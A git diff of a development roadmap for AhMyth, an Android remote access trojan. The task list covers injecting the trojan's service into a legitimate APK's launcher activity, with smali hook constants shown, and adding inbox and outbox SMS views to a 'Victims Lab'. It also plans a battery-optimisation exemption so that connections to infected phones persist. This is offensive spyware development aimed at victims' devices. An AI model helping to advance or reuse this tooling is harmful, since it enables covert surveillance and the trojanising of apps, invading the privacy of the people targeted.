@@ -1,53 +1,41 @@
 ## Stability Updates:
 
-- [x] 01: Figure out why AhMyth is so unstable on 
-Windows machines!
+- [x] 01: Figure out why AhMyth is so unstable on Windows machines!
+
+- Done! Was due to outdated coding in the `main.js` file, as well as a bug in the Modification of a legit APK files Launcher Activity when utilising the `On Launch` binding method.
+#
+- [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
+#
+- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
+```js
+exports.hookPoint = "return-void";
 ```
-Done, was due to outdated coding in `main.js` + and an old electron version (`electron v9.0.0`).
+...then replace the exported `serviceSrc` variable in the `Constants.js` file with the new static hook metbod...
+```js
+exports.serviceSrc = '/n/n invoke-static {}, Lahmyth/mine/king/ahmyth/';
+```
+...then replace the exported `serviceStart` variable in the `Constants.js` file.
+```js
+exports.serviceStart = 'MainService;->start()V' +
+'/n/n' +
+'return-void';
 ```
 #
-- [ ] 02: Fully stabilise `On Launch` binding method by effectively 
-allowing AhMyth to search for the
-```smali
-->onCreate()V
-```
-method if the...
-```
-->onCreate(Landroid/os/Bundle;)V
-```
-method is not found in the **Launcher Activity**, 
-and throw an error if both methods aren't found.
-#
-- [x] 03: Figure out how to allow AhMyth to search `smali_classes` directories, 
+- [x] 04: Figure out how to allow AhMyth to search `smali_classes` directories, 
 if the launcher activity is not present anywhere in the `smali` directory.
 
+- Done For Windows, Linux & macOS! A new cross platform `Bind On Launch` function has been implemented which fixes major bugs & previous limitations for Windows, macOS & Linux.
+#
+- [ ] 05. Stabilise the SMS feature by adding the ability to view sent SMS's in an `Outbox SMS` sub-tab next to a separate `Inbox SMS` sub-tab when using the Victims Lab's SMS feature, a small example of this can be seen below.
 ```
-Done For Windows, Linux & macOS FINALLY!!
-
-For Windows, we've made use of the `set-location` & `gci (get-childItem)` commands
-to recursively locate the launcher activity and return a RELATIVE (NOT ABSOLUTE) path 
-to the launcher activity from inside the selected decompiled APK.
-
-The Linux variant utilises GNU findUtil's "find" command
-to recursively locate the launcher activity and return a RELATIVE (NOT ABSOLUTE) path 
-to the launcher activity from inside the selected decompiled APK.
-
-macOS variant utilises the Apple's built in BSD findUtils `find` command
-to recursively locate the launcher activity and return a RELATIVE (NOT ABSOLUTE) path 
-to the launcher activity from inside the selected decompiled APK.
+| SMS |
+|_____| Send an SMS |
+|___________| Inbox |
+|___________| Outbox|
 ```
 #
-- [ ] 04. Stabilise the SMS feature by adding the ability to view sent SMS's 
-with inbox SMS's, and possibly view Conversation lists as well.
+- [ ] 06: Fix the binaries for 1.0-Beta.4 Release!
 #
-- [ ] 05: Update *socket.io-client java 0.8.3* to *socket.io-client java 2.0.1* 
-and test the client with the Server's Socket.io v4.x.x
+- [ ] 07: Implement the `REQUEST_IGNORE_BATTERY_OPTIMISATION` manifest permission in such a way where it wont be replaced when using the `Custom Permissions` feature.
 #
-- [ ] 06: Fix the f###ing binaries for 1.0-Beta.4 Release!
-#
-- [ ] 07: Implement battery ignorance as well as proper background activity for 
-longer connections while the client is in sleep mode.
-#
-- [ ] 08: Update the autoinstall script to install AhMyth based on the current supported OS's 
-if they're detected after running the script, the script should also check to see if the required 
-dependencies are installed, and install them if they're aren't.
+- [ ] 08: Update the autoinstall script to install AhMyth based on the current supported OS's if they're detected after running the script, the script should also check to see if the required dependencies are installed, and install them if they're aren't.
